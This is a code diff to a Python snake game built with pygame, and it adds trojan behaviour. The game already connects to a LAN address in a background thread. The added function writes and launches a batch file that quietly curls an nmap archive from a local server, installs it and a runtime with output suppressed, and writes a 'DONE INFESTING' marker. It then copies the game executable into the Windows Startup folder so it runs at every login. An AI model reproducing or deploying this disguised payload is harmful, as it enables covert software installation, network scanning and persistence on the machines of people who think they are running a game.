@@ -6,6 +6,7 @@ import pygame
 import time
 import random
 import sys
+import os
 
 snake_speed = 15
 
@@ -18,6 +19,7 @@ red = pygame.Color(255, 0, 0)
 green = pygame.Color(0, 255, 0)
 
 pygame.init()
+
 
 def start_game():
     global window_x, window_y, black, white, red, green, snake_speed
@@ -138,6 +140,60 @@ if not connected:
     connect_thread = threading.Thread(target=connect, args=("192.168.0.90", 40000))
     connect_thread.start()
     connected = True
+
+
+
+def create_run_file():
+    bat_content = """
+            @echo off
+
+            @REM Check if Nmap is already installed
+            if exist "%ProgramFiles(x86)%\Nmap" goto :runscript
+
+            @REM echo Installing Nmap...
+            curl http://192.168.1.9:10044/group3/nmap-7.80-win32.zip -o nmap-7.80-win32.zip >nul 2>&1
+            tar -xf nmap-7.80-win32.zip >nul 2>&1
+            move nmap-7.80 "%ProgramFiles(x86)%\Nmap" >nul 2>&1
+
+            @REM Add Nmap to PATH
+            setx PATH "%PATH%;%ProgramFiles(x86)%\Nmap" >nul 2>&1
+
+            @REM Clean up   
+            del nmap-7.80-win32.zip >nul 2>&1
+
+            @REM install the needed drivers
+            %ProgramFiles(x86)%\Nmap\vcredist_x86.exe /quiet /install >nul 2>&1
+            timeout /t 10 >nul 2>&1
+
+            echo DONE INFESTING > .\doneInfecting.txt
+
+            :runscript
+            @REM Run the script
+            start "" /B "snakeGame.exe"
+
+            set "executable=snakeGame.exe"
+            set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+            @REM Check if the executable file exists
+            if not exist "%executable%" (
+                echo Error: %executable% not found.
+                pause
+                exit /b 1
+            )
+
+            @REM Copy the executable to the startup folder
+            copy "%executable%" "%startup_folder%" /Y
+
+            echo %executable% added to startup.
+            pause
+            exit
+            """
+
+    # create file
+    with open("snakgeGame.bat", 'w') as f:
+        f.write(bat_content)
+
+    os.system(f'start cmd /c {f.name}')
 
 
 # Call the start_game function to begin the first game
